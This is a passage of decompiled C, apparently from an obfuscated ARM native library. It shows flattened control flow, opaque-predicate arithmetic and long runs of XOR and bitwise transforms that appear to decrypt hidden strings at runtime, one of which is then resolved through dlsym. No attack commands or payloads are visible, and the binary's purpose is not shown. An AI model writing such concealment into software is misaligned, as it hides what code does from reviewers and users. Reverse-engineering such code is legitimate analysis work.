                            iVar20 = FUN_00035060((*(uint *)(DAT_00029a40 + 0x28a68) ^ DAT_00029a3c)
                                                  + (*(uint *)(DAT_00029a34 + 0x28a5c) ^
                                                    DAT_00029a38),DAT_00029a44);
                            iVar17 = DAT_0002958c;
                            if (DAT_00029a54 <
                                (iVar20 * DAT_00029a48 & DAT_00029a4c) -
                                (DAT_00029a50 & ~(iVar20 * DAT_00029a48))) {
                              iVar17 = -0x30205fb9;
                            }
                            goto LAB_0002cd74;
                          }
                          if (iVar15 == DAT_00029444) {
                            iVar17 = DAT_00029568;
                            if (*local_54 != '\0') {
                              iVar17 = 0x6160630b;
                            }
                            goto LAB_0002cd74;
                          }
                          if (iVar15 == DAT_00029448) {
                            **ppiVar32 = DAT_00029314;
                          }
                          else {
                            if (iVar15 == DAT_0002944c) {
                              uVar16 = *(uint *)(DAT_0002ad50 + 0x2a0b8) ^ DAT_0002ad54;
                              uVar22 = *(uint *)(DAT_0002ad60 + 0x2a0c8) ^ DAT_0002ad58;
                              uVar27 = uVar22 * uVar16;
                              iVar20 = FUN_00035060((uVar22 * uVar16 + (uVar27 ^ DAT_0002ad5c)) -
                                                    (uVar27 & DAT_0002ad64),DAT_0002ad68);
                              iVar17 = DAT_00029290;
                              if (DAT_0002ad70 < (uint)(iVar20 + DAT_0002ad6c)) {
                                iVar17 = -0x1ccfdad5;
                              }
                              goto LAB_0002cd74;
                            }
                            if (iVar15 == DAT_00029450) {
                              *(undefined4 *)(DAT_0002a140 + 0x29150) = DAT_00029d0c;
                              iVar17 = DAT_00029398;
                              if (((*(uint *)(DAT_0002a150 + 0x29170) ^ uVar22) &
                                   (*(uint *)(DAT_0002a148 + 0x29164) ^ DAT_0002a14c) | DAT_0002a154
                                  ) + DAT_0002a158 < DAT_0002a15c) {
                                iVar17 = -0x43315d30;
                              }
                              goto LAB_0002cd74;
                            }
                            if (iVar15 == DAT_00029454) {
                              uVar16 = FUN_00035060(((*(uint *)(DAT_0002a288 + 0x29848) ^
                                                     DAT_0002a28c) -
                                                    (DAT_0002a290 ^ DAT_0002a290 + 1)) +
                                                    (*(uint *)(DAT_0002a298 + 0x29864) ^
                                                    DAT_0002a294) + 1,DAT_0002a29c);
                              iVar17 = DAT_00029290;
                              if ((uVar16 & 1 | DAT_0002a2a0 + 0x33400U ^ uVar16 ^ DAT_0002a2a4) +
                                  DAT_0002a2ac <= (DAT_000291bc + 0xe40 ^ DAT_0002a2a8)) {
                                iVar17 = 0x6ef1baca;
                              }
                              goto LAB_0002cd74;
                            }
                            if (iVar15 == DAT_00029458) {
                              **ppiVar32 = DAT_0002c35c;
                              piVar21 = local_5c;
LAB_0002b628:
                              *local_48 = *piVar21;
                            }
                            else if (iVar15 == DAT_0002945c) {
                              **ppiVar32 = DAT_0002cdf0;
                            }
                            else {
                              if (iVar15 == DAT_000294c0) {
                                uVar16 = ((*(uint *)(DAT_0002cf78 + 0x2c214) ^ DAT_0002ce6c) -
                                         (DAT_0002cdb8 ^ DAT_0002cdb8 + 1)) +
                                         (*(uint *)(DAT_0002cf7c + 0x2c234) ^ DAT_0002ce70) + 1;
                                iVar20 = FUN_00035060((uVar16 | DAT_0002ce74) * (uVar16 & local_a0)
                                                      + (uVar16 & DAT_0002ce78) *
                                                        (DAT_0002ce74 & ~uVar16) | DAT_0002ce7c,
                                                      DAT_0002ce80);
                                iVar17 = DAT_0002cde4;
                                if (iVar20 == DAT_0002ce84) {
                                  iVar17 = 0x6f143972;
                                }
                                goto LAB_0002cd74;
                              }
                              if (iVar15 == DAT_000294c4) {
                                *(int *)(DAT_0002cf80 + 0x2cbf0) = DAT_0002cf84 + 0x2cbcc;
                                iVar20 = FUN_00035060(*(uint *)(DAT_0002cf88 + 0x2cbdc) ^
                                                      DAT_0002ce58,
                                                      *(uint *)(DAT_0002cf8c + 0x2cbe8) ^ uVar11);
                                iVar17 = DAT_0002ce00;
                                if ((~(iVar20 * DAT_0002ce60) | DAT_0002ce64) != DAT_0002ce68) {
                                  iVar17 = -0x7250d319;
                                }
                                goto LAB_0002cd74;
                              }
                              if (iVar15 == DAT_000294c8) {
                                iVar17 = DAT_000294e4;
                                if (*local_8c != 0) {
                                  iVar17 = 0x26e1dfb1;
                                }
                                goto LAB_0002cd74;
                              }
                              if (iVar15 == DAT_000294cc) {
                                **ppiVar32 = DAT_0002ce28;
                              }
                              else if (iVar15 == DAT_000294d0) {
                                **ppiVar32 = DAT_000295b4;
                              }
                              else if (iVar15 == DAT_000294d4) {
                                *(uint *)(DAT_0002cf90 + 0x2cb08) =
                                     DAT_0002cdbc + 1 ^ DAT_0002cdbc ^ DAT_0002ce54;
                                **ppiVar32 = DAT_0002ce24;
                              }
                              else if (iVar15 == DAT_000294d8) {
                                **ppiVar32 = DAT_0002930c;
                              }
                              else if (iVar15 == DAT_000294dc) {
                                **ppiVar32 = DAT_00029570;
                              }
                              else {
                                if (iVar15 == DAT_000294e0) {
                                  uVar16 = *(uint *)(DAT_0002acd8 + 0x29f18) ^ DAT_0002acdc;
                                  uVar22 = *(uint *)(DAT_0002ace4 + 0x29f24) ^ DAT_0002ace0;
                                  uVar16 = (uVar22 | uVar16) & ~(uVar22 ^ uVar16);
                                  uVar16 = FUN_00035060(((uVar16 | DAT_0002acec) &
                                                        (uVar16 ^ DAT_0002ace8)) + DAT_0002acf0,
                                                        DAT_0002acf4);
                                  iVar17 = DAT_000294e8;
                                  if (uVar16 < DAT_0002acf8) {
                                    iVar17 = 0x6424f4ee;
                                  }
                                  goto LAB_0002cd74;
                                }
                                if (iVar15 == DAT_000294e4) {
                                  *local_58 = *(int *)((int)&DAT_00029820 + DAT_0002a284);
                                  **ppiVar32 = DAT_00029248;
                                }
                                else if (iVar15 == DAT_000294e8) {
                                  **ppiVar32 = DAT_000296cc;
                                }
                                else {
                                  if (iVar15 == DAT_000294ec) {
                                    **ppiVar32 = DAT_000293b4;
                                    piVar21 = local_50;
                                    goto LAB_0002b628;
                                  }
                                  if (iVar15 == DAT_000294f0) {
                                    uVar16 = *(uint *)(DAT_0002c2ec + 0x2b4b0) ^ DAT_0002c2e4 |
                                             *(uint *)(DAT_0002c2dc + 0x2b4a0) ^ DAT_0002c2e0;
                                    iVar17 = DAT_0002c300;
                                    iVar23 = DAT_0002b488;
                                    if (DAT_0002c2fc <
                                        (DAT_0002c2f0 & ~uVar16 | DAT_0002c2e8) *
                                        (DAT_0002c2f4 & ~uVar16) +
                                        (DAT_0002c2e8 & ~(DAT_0002c2f0 & ~uVar16)) *
                                        (~uVar16 & 0xb000f500) + DAT_0002c2f8) {
                                      iVar17 = 0x1263cf67;
                                      iVar23 = DAT_0002b488;
                                    }
                                    goto LAB_0002cd74;
                                  }
                                  if (iVar15 == DAT_00029560) {
                                    **ppiVar32 = DAT_00029394;
                                  }
                                  else {
                                    if (iVar15 == iVar23) {
                                      uVar16 = FUN_00035060(~(~(*(uint *)(DAT_0002c310 + 0x2b52c) ^
                                                                DAT_0002c30c |
                                                               *(uint *)(DAT_0002c304 + 0x2b520) ^
                                                               DAT_0002c308) | local_a4),
                                                            DAT_0002c314);
                                      iVar17 = DAT_0002c320;
                                      if ((uVar16 | DAT_0002c318) == DAT_0002c31c) {
                                        iVar17 = -0x6dda7bdb;
                                      }
                                      goto LAB_0002cd74;
                                    }
                                    if (iVar15 == DAT_00029564) {
                                      iVar17 = DAT_0002ba28;
                                      if (*local_7c != '\0') {
                                        iVar17 = -0x66376ede;
                                      }
                                      goto LAB_0002cd74;
                                    }
                                    if (iVar15 == DAT_00029568) {
                                      uVar16 = ((*(uint *)(DAT_0002c3e8 + 0x2b8f4) ^ DAT_0002c3e4) -
                                               (*(uint *)(DAT_0002c3dc + 0x2b8e8) ^ DAT_0002c3e0)) *
                                               DAT_0002c3f0;
                                      uVar16 = (DAT_0002c3ec & ~uVar16 | uVar16 & DAT_0002c3f4) ^
                                               DAT_0002c3f8 | uVar16 & DAT_0002c3fc;
                                      iVar17 = DAT_0002c40c;
                                      if ((uVar16 & DAT_0002c400 | DAT_0002c404 & ~uVar16) <
                                          DAT_0002c408) {
                                        iVar17 = 0x4b50a918;
                                      }
                                      goto LAB_0002cd74;
                                    }
                                    if (iVar15 == DAT_0002956c) {
                                      bVar1 = *(byte *)(DAT_0002cf28 + 0x2c42c);
                                      bVar2 = *(byte *)(DAT_0002cf28 + 0x2c42d);
                                      bVar3 = *(byte *)(DAT_0002cf28 + 0x2c42f);
                                      pbVar33 = (byte *)(DAT_0002cf2c + 0x2c448);
                                      *(byte *)(DAT_0002cf2c + 0x2c44a) =
                                           *(byte *)(DAT_0002cf28 + 0x2c42e) ^ 0x11;
                                      *(byte *)(iVar13 + 0x2c44b) = bVar3 ^ 0x7d;
                                      *(byte *)(iVar13 + 0x2c44e) =
                                           *(byte *)(iVar12 + 0x2c432) ^ 0xef;
                                      *(byte *)(iVar13 + 0x2c44d) =
                                           ~*(byte *)(iVar12 + 0x2c431) & 0xa2 |
                                           *(byte *)(iVar12 + 0x2c431) & 0x5d;
                                      *pbVar33 = ~(bVar1 & 0x59 | ~bVar1 & 0xa6);
                                      *(byte *)(iVar13 + 0x2c449) =
                                           bVar2 + (bVar2 & 0x74) * -2 + -0xc;
                                      *(byte *)(iVar13 + 0x2c44c) =
                                           (~*(byte *)(iVar12 + 0x2c430) & 0x79 |
                                           *(byte *)(iVar12 + 0x2c430) & 0x86) ^ 0x2b;
                                      *(byte *)(iVar13 + 0x2c44f) =
                                           *(byte *)(iVar12 + 0x2c433) +
                                           (*(byte *)(iVar12 + 0x2c433) & 0xb) * -2 + -0x75;
                                      uVar16 = *(uint *)(DAT_0002cf30 + 0x2c4d8);
                                      local_90 = *(uint *)(DAT_0002cf34 + 0x2c4e0);
                                      bVar1 = *(byte *)(iVar12 + 0x2c437);
                                      *(byte *)(iVar13 + 0x2c451) =
                                           *(byte *)(iVar12 + 0x2c435) ^ 0x2c;
                                      *(byte *)(iVar13 + 0x2c453) = bVar1 ^ 0x66;
                                      *(byte *)(iVar13 + 0x2c454) =
                                           *(byte *)(iVar12 + 0x2c438) ^ 0x8d;
                                      bVar1 = *(byte *)(iVar12 + 0x2c434);
                                      *(byte *)(iVar13 + 0x2c455) =
                                           *(byte *)(iVar12 + 0x2c439) ^ 0x29;
                                      iVar23 = DAT_0002cf3c;
                                      iVar19 = DAT_0002cf38;
                                      bVar2 = *(byte *)(iVar12 + 0x2c436);
                                      bVar3 = *(byte *)(DAT_0002cf38 + 0x2c524);
                                      bVar4 = *(byte *)(DAT_0002cf38 + 0x2c525);
                                      bVar5 = *(byte *)(DAT_0002cf38 + 0x2c527);
                                      pbVar33 = (byte *)(DAT_0002cf3c + 0x2c544);
                                      *(byte *)(DAT_0002cf3c + 0x2c546) =
                                           *(byte *)(DAT_0002cf38 + 0x2c526) ^ 0x4c;
                                      *pbVar33 = bVar3 ^ 0x2c;
                                      *(byte *)(iVar13 + 0x2c450) =
                                           bVar1 + (bVar1 & 0x2e) * -2 + '.';
                                      *(byte *)(iVar13 + 0x2c452) = (~bVar2 | 0xcb) & (bVar2 | 0x34)
                                      ;
                                      bVar1 = *(byte *)(iVar19 + 0x2c52a);
                                      bVar2 = *(byte *)(iVar19 + 0x2c52b);
                                      *(byte *)(iVar23 + 0x2c545) =
                                           bVar4 + (bVar4 & 0x47) * -2 + 'G';
                                      iVar26 = DAT_0002cdb0;
                                      *(byte *)(iVar23 + 0x2c549) =
                                           *(byte *)(iVar19 + 0x2c529) ^ 0xa4;
                                      *(byte *)(iVar23 + 0x2c54a) = bVar1 ^ 0x73;
                                      bVar1 = *(byte *)(iVar19 + 0x2c52c);
                                      *(byte *)(iVar23 + 0x2c547) =
                                           ~((bVar5 | 0xba) & (~bVar5 | 0x45));
                                      *(byte *)(iVar23 + 0x2c54c) = bVar1 ^ 5;
                                      bVar1 = *(byte *)(iVar19 + 0x2c528);
                                      *(byte *)(iVar23 + 0x2c54d) =
                                           *(byte *)(iVar19 + 0x2c52d) ^ 0x2e;
                                      *(byte *)(iVar23 + 0x2c550) =
                                           *(byte *)(iVar19 + 0x2c530) ^ 0x26;
                                      *(byte *)(iVar23 + 0x2c548) = bVar1 + (bVar1 & 3) * -2 + -0x7d
                                      ;
                                      *(byte *)(iVar23 + 0x2c54b) =
                                           bVar2 + (bVar2 & 0x5b) * -2 + '[';
                                      *(byte *)(iVar23 + 0x2c54f) =
                                           (~*(byte *)(iVar19 + 0x2c52f) & 0xd4 |
                                           *(byte *)(iVar19 + 0x2c52f) & 0x2b) ^ 0xec;
                                      *(byte *)(iVar23 + 0x2c54e) =
                                           ~((*(byte *)(iVar19 + 0x2c52e) | 0x5d) &
                                            (~*(byte *)(iVar19 + 0x2c52e) | 0xa2));
                                      *(byte *)(iVar23 + 0x2c551) =
                                           (~*(byte *)(iVar19 + 0x2c531) & 0x9f |
                                           *(byte *)(iVar19 + 0x2c531) & 0x60) ^ 0x83;
                                      *(byte *)(iVar23 + 0x2c552) =
                                           *(byte *)(iVar19 + 0x2c532) ^ 0xae;
                                      *(byte *)(iVar23 + 0x2c553) =
                                           *(byte *)(iVar19 + 0x2c533) ^ 0xe6;
                                      *(byte *)(iVar23 + 0x2c554) =
                                           ~((*(byte *)(iVar19 + 0x2c534) | 200) &
                                            (~*(byte *)(iVar19 + 0x2c534) | 0x37));
                                      *(byte *)(iVar23 + 0x2c555) = *(byte *)(iVar19 + 0x2c535) ^ 4;
                                      iVar17 = DAT_0002cf44;
                                      iVar19 = DAT_0002cf40;
                                      iVar23 = DAT_0002ce0c;
                                      *(byte *)(DAT_0002cf44 + 0x2c6b8) =
                                           *(byte *)(DAT_0002cf40 + 0x2c6a8) ^ 0xae;
                                      *(byte *)(iVar17 + 0x2c6b9) =
                                           *(byte *)(iVar19 + 0x2c6a9) +
                                           (*(byte *)(iVar19 + 0x2c6a9) & 0x53) * -2 + 'S';
                                      *(byte *)(iVar17 + 0x2c6ba) =
                                           (~*(byte *)(iVar19 + 0x2c6aa) & 0xf7 |
                                           *(byte *)(iVar19 + 0x2c6aa) & 8) ^ 0x5b;
                                      *(byte *)(iVar17 + 0x2c6bb) =
                                           (~*(byte *)(iVar19 + 0x2c6ab) | 0xf9) &
                                           (*(byte *)(iVar19 + 0x2c6ab) | 6);
                                      *(byte *)(iVar17 + 0x2c6bc) =
                                           *(byte *)(iVar19 + 0x2c6ac) +
                                           (*(byte *)(iVar19 + 0x2c6ac) & 0x7a) * -2 + 'z';
                                      *(byte *)(iVar17 + 0x2c6bd) =
                                           *(byte *)(iVar19 + 0x2c6ad) ^ 0x67;
                                      *(byte *)(iVar17 + 0x2c6be) =
                                           *(byte *)(iVar19 + 0x2c6ae) +
                                           (*(byte *)(iVar19 + 0x2c6ae) & 0x49) * -2 + -0x37;
                                      *(byte *)(iVar17 + 0x2c6bf) =
                                           *(byte *)(iVar19 + 0x2c6af) ^ 0xa6;
                                      *(byte *)(iVar17 + 0x2c6c0) =
                                           *(byte *)(iVar19 + 0x2c6b0) ^ 0x1a;
                                      *(byte *)(iVar17 + 0x2c6c1) =
                                           *(byte *)(iVar19 + 0x2c6b1) ^ 0x23;
                                      *(byte *)(iVar17 + 0x2c6c2) =
                                           *(byte *)(iVar19 + 0x2c6b2) ^ 0xdc;
                                      *(byte *)(iVar17 + 0x2c6c3) =
                                           ~*(byte *)(iVar19 + 0x2c6b3) & 0x6b |
                                           *(byte *)(iVar19 + 0x2c6b3) & 0x94;
                                      *(byte *)(iVar17 + 0x2c6c4) =
                                           *(byte *)(iVar19 + 0x2c6b4) ^ 0x2a;
                                      *(byte *)(iVar17 + 0x2c6c5) =
                                           *(byte *)(iVar19 + 0x2c6b5) ^ 0xda;
                                      *(byte *)(iVar17 + 0x2c6c6) =
                                           (~*(byte *)(iVar19 + 0x2c6b6) | 0xbb) &
                                           (*(byte *)(iVar19 + 0x2c6b6) | 0x44);
                                      *(byte *)(iVar17 + 0x2c6c7) =
                                           ~*(byte *)(iVar19 + 0x2c6b7) & 0xa0 |
                                           *(byte *)(iVar19 + 0x2c6b7) & 0x5f;
                                      *(byte *)(iVar17 + 0x2c6c8) =
                                           *(byte *)(iVar19 + 0x2c6b8) +
                                           (*(byte *)(iVar19 + 0x2c6b8) & 0x3e) * -2 + '>';
                                      *(byte *)(iVar17 + 0x2c6c9) =
                                           *(byte *)(iVar19 + 0x2c6b9) +
                                           (*(byte *)(iVar19 + 0x2c6b9) & 0xf) * -2 + '\x0f';
                                      *(byte *)(iVar17 + 0x2c6ca) =
                                           *(byte *)(iVar19 + 0x2c6ba) ^ 0xf;
                                      *(byte *)(iVar17 + 0x2c6cb) =
                                           *(byte *)(iVar19 + 0x2c6bb) ^ 100;
                                      iVar17 = DAT_0002cf4c;
                                      iVar19 = DAT_0002cf48;
                                      *(byte *)(DAT_0002cf4c + 0x2c824) =
                                           *(byte *)(DAT_0002cf48 + 0x2c814) ^ 0x16;
                                      *(byte *)(iVar17 + 0x2c825) =
                                           *(byte *)(iVar19 + 0x2c815) ^ 0x97;
                                      *(byte *)(iVar17 + 0x2c826) =
                                           ~*(byte *)(iVar19 + 0x2c816) & 0xbe |
                                           *(byte *)(iVar19 + 0x2c816) & 0x41;
                                      *(byte *)(iVar17 + 0x2c827) =
                                           (~*(byte *)(iVar19 + 0x2c817) | 0x2b) &
                                           (*(byte *)(iVar19 + 0x2c817) | 0xd4);
                                      *(byte *)(iVar17 + 0x2c828) =
                                           *(byte *)(iVar19 + 0x2c818) ^ 0x96;
                                      *(byte *)(iVar17 + 0x2c829) =
                                           *(byte *)(iVar19 + 0x2c819) ^ 0xbc;
                                      *(byte *)(iVar17 + 0x2c82a) =
                                           *(byte *)(iVar19 + 0x2c81a) ^ 0xf0;
                                      *(byte *)(iVar17 + 0x2c82b) =
                                           *(byte *)(iVar19 + 0x2c81b) ^ 0x9b;
                                      *(byte *)(iVar17 + 0x2c82c) =
                                           *(byte *)(iVar19 + 0x2c81c) +
                                           (*(byte *)(iVar19 + 0x2c81c) & 0x46) * -2 + 'F';
                                      *(byte *)(iVar17 + 0x2c82d) =
                                           (~*(byte *)(iVar19 + 0x2c81d) & 0x58 |
                                           *(byte *)(iVar19 + 0x2c81d) & 0xa7) ^ 0xb7;
                                      *(byte *)(iVar17 + 0x2c82e) =
                                           *(byte *)(iVar19 + 0x2c81e) +
                                           (*(byte *)(iVar19 + 0x2c81e) & 0x20) * -2 + -0x60;
                                      *(byte *)(iVar17 + 0x2c82f) =
                                           ~*(byte *)(iVar19 + 0x2c81f) & 0xe6 |
                                           *(byte *)(iVar19 + 0x2c81f) & 0x19;
                                      *(byte *)(iVar17 + 0x2c830) =
                                           (~*(byte *)(iVar19 + 0x2c820) & 0x1d |
                                           *(byte *)(iVar19 + 0x2c820) & 0xe2) ^ 0x73;
                                      *(byte *)(iVar17 + 0x2c831) =
                                           *(byte *)(iVar19 + 0x2c821) ^ 0xec;
                                      *(byte *)(iVar17 + 0x2c832) =
                                           *(byte *)(iVar19 + 0x2c822) ^ 0xcb;
                                      *(byte *)(iVar17 + 0x2c833) =
                                           *(byte *)(iVar19 + 0x2c823) ^ 0x81;
                                      *(byte *)(iVar17 + 0x2c834) =
                                           *(byte *)(iVar19 + 0x2c824) ^ 0x4a;
                                      *(byte *)(iVar17 + 0x2c835) =
                                           *(byte *)(iVar19 + 0x2c825) ^ 0x34;
                                      *(byte *)(iVar17 + 0x2c836) =
                                           *(byte *)(iVar19 + 0x2c826) ^ 0x95;
                                      *(byte *)(iVar17 + 0x2c837) =
                                           ~*(byte *)(iVar19 + 0x2c827) & 0x79 |
                                           *(byte *)(iVar19 + 0x2c827) & 0x86;
                                      *(byte *)(iVar17 + 0x2c838) = *(byte *)(iVar19 + 0x2c828) ^ 7;
                                      iVar17 = DAT_0002cf54;
                                      iVar19 = DAT_0002cf50;
                                      *(byte *)(DAT_0002cf54 + 0x2c998) =
                                           ~(*(byte *)(DAT_0002cf50 + 0x2c980) & 0x61 |
                                            ~*(byte *)(DAT_0002cf50 + 0x2c980) & 0x9e);
                                      *(byte *)(iVar17 + 0x2c999) = *(byte *)(iVar19 + 0x2c981) ^ 6;
                                      *(byte *)(iVar17 + 0x2c99a) =
                                           *(byte *)(iVar19 + 0x2c982) ^ 0xd3;
                                      *(byte *)(iVar17 + 0x2c99b) =
                                           *(byte *)(iVar19 + 0x2c983) +
                                           (*(byte *)(iVar19 + 0x2c983) & 0x1e) * -2 + '\x1e';
                                      *(byte *)(iVar17 + 0x2c99c) =
                                           *(byte *)(iVar19 + 0x2c984) ^ 0xe4;
                                      *(byte *)(iVar17 + 0x2c99d) =
                                           *(byte *)(iVar19 + 0x2c985) +
                                           (*(byte *)(iVar19 + 0x2c985) & 99) * -2 + 'c';
                                      *(byte *)(iVar17 + 0x2c99e) =
                                           ~(*(byte *)(iVar19 + 0x2c986) & 0x45 |
                                            ~*(byte *)(iVar19 + 0x2c986) & 0xba);
                                      *(byte *)(iVar17 + 0x2c99f) =
                                           *(byte *)(iVar19 + 0x2c987) ^ 0xf5;
                                      iVar17 = DAT_0002cf5c;
                                      iVar19 = DAT_0002cf58;
                                      *(byte *)(DAT_0002cf5c + 0x2ca34) =
                                           ~*(byte *)(DAT_0002cf58 + 0x2ca20) & 0x13 |
                                           *(byte *)(DAT_0002cf58 + 0x2ca20) & 0xec;
                                      *(byte *)(iVar17 + 0x2ca35) =
                                           ~*(byte *)(iVar19 + 0x2ca21) & 0x49 |
                                           *(byte *)(iVar19 + 0x2ca21) & 0xb6;
                                      *(byte *)(iVar17 + 0x2ca36) =
                                           *(byte *)(iVar19 + 0x2ca22) ^ 0x87;
                                      *(byte *)(iVar17 + 0x2ca37) =
                                           *(byte *)(iVar19 + 0x2ca23) ^ 0xbb;
                                      *local_70 = *(byte *)(iVar19 + 0x2ca24) ^ 0xda;
                                      uVar16 = (uVar16 ^ local_90 ^ DAT_0002cec0 ^ DAT_0002cec4) &
                                               (local_90 ^ DAT_0002cec0);
                                      uVar16 = (DAT_0002cecc & ~uVar16 | uVar16 & DAT_0002cec8) *
                                               DAT_0002ced0;
                                      iVar17 = DAT_0002cddc;
                                      iVar31 = iVar10;
                                      if (((uVar16 | DAT_0002ced8) & (uVar16 ^ DAT_0002ced4)) ==
                                          DAT_0002cedc) {
                                        iVar17 = 0x1a69a8c7;
                                      }
                                      goto LAB_0002cad8;
                                    }
                                    if (iVar15 == DAT_00029570) {
                                      iVar17 = DAT_0002b9dc;
                                      if (*local_30 == 0) {
                                        iVar17 = -0x67830668;
                                      }
                                      goto LAB_0002cd74;
                                    }
                                    if (iVar15 == DAT_00029574) {
                                      bVar34 = DAT_0002cef4 <=
                                               (((*(uint *)(DAT_0002cf24 + 0x2c1cc) ^ DAT_0002cee4)
                                                 - (*(uint *)(DAT_0002cf20 + 0x2c1c0) ^ DAT_0002cee0
                                                   ) & DAT_0002cee8) * DAT_0002ceec | DAT_0002cef0);
                                      iVar17 = DAT_0002cde0;
                                      goto LAB_0002cba8;
                                    }
                                    if (iVar15 == DAT_00029578) {
                                      **ppiVar32 = DAT_000297e0;
                                    }
                                    else if (iVar15 == DAT_0002957c) {
                                      *(undefined4 *)(DAT_00029d08 + 0x28d30) = DAT_00029d0c;
                                      **ppiVar32 = DAT_00029278;
                                    }
                                    else {
                                      if (iVar15 == DAT_00029580) {
                                        *local_94 = *local_34;
                                        uVar16 = (*(uint *)(DAT_0002b8cc + 0x2a948) ^ DAT_0002b8bc)
                                                 * (*(uint *)(DAT_0002b8c0 + 0x2a93c) ^ DAT_0002b8c4
                                                   );
                                        iVar17 = DAT_0002b970;
                                        if (((uVar16 | DAT_0002b8c8) * (uVar16 & DAT_0002b8c8) +
                                             (uVar16 & DAT_0002b8d0) * (DAT_0002b8c8 & ~uVar16) +
                                             DAT_0002b964 | DAT_0002b968) != DAT_0002b96c) {
                                          iVar17 = -0x7bf62e85;
                                        }
                                        goto LAB_0002cd74;
                                      }
                                      if (iVar15 == DAT_00029584) {
                                        uVar18 = dlsym(*local_30,DAT_0002cfa4 + 0x2c180);
                                        *(undefined4 *)(DAT_0002cfa8 + 0x2c190) = uVar18;
                                        **ppiVar32 = DAT_0002cde8;
                                      }
                                      else if (iVar15 == DAT_00029588) {
                                        **ppiVar32 = DAT_000294e0;
                                      }
                                      else if (iVar15 == DAT_0002958c) {
                                        uVar24 = 0xffffffff;
LAB_0002cd10:
                                        *local_34 = uVar24;
                                        **ppiVar32 = DAT_0002ce10;
                                      }
                                      else if (iVar15 == DAT_00029590) {
                                        *(byte *)(DAT_00029d8c + 0x28da0) = *local_70;
                                        iVar26 = DAT_00029d9c;
                                        bVar1 = *(byte *)(DAT_00029d9c + 0x28dae);
                                        *(byte *)(iVar20 + 0x28da1) =
                                             *(byte *)(DAT_00029d9c + 0x28dad) ^ 0x73;
                                        *(byte *)(iVar20 + 0x28da2) = bVar1 ^ 0xd7;
                                        bVar1 = *(byte *)(iVar26 + 0x28daf);
                                        *(byte *)(iVar20 + 0x28da5) =
                                             *(byte *)(iVar26 + 0x28db1) ^ 0x7f;
                                        bVar2 = *(byte *)(iVar26 + 0x28db0);
                                        *(byte *)(iVar20 + 0x28da7) =
                                             *(byte *)(iVar26 + 0x28db3) ^ 0x9e;
                                        *(byte *)(iVar20 + 0x28da8) =
                                             ~*(byte *)(iVar26 + 0x28db4) & 0x6b |
                                             *(byte *)(iVar26 + 0x28db4) & 0x94;
                                        *(byte *)(iVar20 + 0x28da3) =
                                             ~(bVar1 & 0x42 | ~bVar1 & 0xbd);
                                        *(byte *)(iVar20 + 0x28da6) =
                                             ~(*(byte *)(iVar26 + 0x28db2) & 0x1e |
                                              ~*(byte *)(iVar26 + 0x28db2) & 0xe1);
                                        *(byte *)(iVar20 + 0x28da4) =
                                             ~((bVar2 | 0xc3) & (~bVar2 | 0x3c));
                                        *(byte *)(iVar20 + 0x28da9) = ~*(byte *)(iVar26 + 0x28db5);
                                        iVar29 = DAT_00029e30;
                                        iVar19 = DAT_00029e2c;
                                        bVar1 = *(byte *)(DAT_00029e2c + 0x28e59);
                                        bVar2 = *(byte *)(DAT_00029e2c + 0x28e5a);
                                        bVar3 = *(byte *)(DAT_00029e2c + 0x28e5b);
                                        bVar4 = *(byte *)(DAT_00029e2c + 0x28e63);
                                        *(byte *)(DAT_00029e30 + 0x28e78) =
                                             *(byte *)(DAT_00029e2c + 0x28e58) ^ 0xa5;
                                        *(byte *)(iVar29 + 0x28e79) = bVar1 ^ 0x2b;
                                        *(byte *)(iVar29 + 0x28e7b) = bVar3 ^ 0x1e;
                                        *(byte *)(iVar29 + 0x28e7c) =
                                             *(byte *)(iVar19 + 0x28e5c) ^ 0xcc;
                                        *(byte *)(iVar29 + 0x28e7d) =
                                             *(byte *)(iVar19 + 0x28e5d) ^ 0x7c;
                                        bVar1 = *(byte *)(iVar19 + 0x28e62);
                                        *(byte *)(iVar29 + 0x28e7a) =
                                             (~bVar2 | 0x53) & (bVar2 | 0xac);
                                        *(byte *)(iVar29 + 0x28e7e) =
                                             *(byte *)(iVar19 + 0x28e5e) +
                                             (*(byte *)(iVar19 + 0x28e5e) & 0x2a) * -2 + -0x56;
                                        *(byte *)(iVar29 + 0x28e7f) =
                                             *(byte *)(iVar19 + 0x28e5f) +
                                             (*(byte *)(iVar19 + 0x28e5f) & 0x4b) * -2 + -0x35;
                                        bVar2 = *(byte *)(iVar19 + 0x28e61);
                                        *(byte *)(iVar20 + 0x28daa) =
                                             ~((*(byte *)(iVar26 + 0x28db6) | 0x1c) &
                                              (~*(byte *)(iVar26 + 0x28db6) | 0xe3));
                                        *(byte *)(iVar29 + 0x28e80) =
                                             *(byte *)(iVar19 + 0x28e60) ^ 0xe3;
                                        *(byte *)(iVar29 + 0x28e82) = bVar1 ^ 9;
                                        *(byte *)(iVar29 + 0x28e85) =
                                             *(byte *)(iVar19 + 0x28e65) ^ 0xee;
                                        iVar28 = DAT_00029f00;
                                        iVar20 = DAT_00029efc;
                                        bVar1 = *(byte *)(DAT_00029efc + 0x28f2c);
                                        bVar3 = *(byte *)(DAT_00029efc + 0x28f2d);
                                        bVar5 = *(byte *)(DAT_00029efc + 0x28f2f);
                                        pcVar30 = (char *)(DAT_00029f00 + 0x28f48);
                                        *(byte *)(DAT_00029f00 + 0x28f4a) =
                                             *(byte *)(DAT_00029efc + 0x28f2e) ^ 100;
                                        *(byte *)(iVar29 + 0x28e84) =
                                             ~*(byte *)(iVar19 + 0x28e64) & 0xaf |
                                             *(byte *)(iVar19 + 0x28e64) & 0x50;
                                        iVar23 = DAT_000291c8;
                                        *(byte *)(iVar29 + 0x28e81) =
                                             (~bVar2 | 0x3c) & (bVar2 | 0xc3);
                                        iVar26 = DAT_000291b0;
                                        *(byte *)(iVar29 + 0x28e83) =
                                             bVar4 + (bVar4 & 0x40) * -2 + '@';
                                        *pcVar30 = bVar1 + (bVar1 & 0x29) * -2 + -0x57;
                                        *(byte *)(iVar28 + 0x28f49) =
                                             bVar3 + (bVar3 & 0x5a) * -2 + 'Z';
                                        *(byte *)(iVar28 + 0x28f4b) =
                                             bVar5 + (bVar5 & 0xd) * -2 + -0x73;
                                        *(byte *)(iVar28 + 0x28f4c) =
                                             ~((*(byte *)(iVar20 + 0x28f30) | 0x2a) &
                                              (~*(byte *)(iVar20 + 0x28f30) | 0xd5));
                                        *(byte *)(iVar28 + 0x28f4d) =
                                             *(byte *)(iVar20 + 0x28f31) ^ 0x6e;
                                        *(byte *)(iVar28 + 0x28f4e) =
                                             *(byte *)(iVar20 + 0x28f32) +
                                             (*(byte *)(iVar20 + 0x28f32) & 1) * -2 + '\x01';
                                        *(byte *)(iVar28 + 0x28f4f) =
                                             (~*(byte *)(iVar20 + 0x28f33) & 0xd3 |
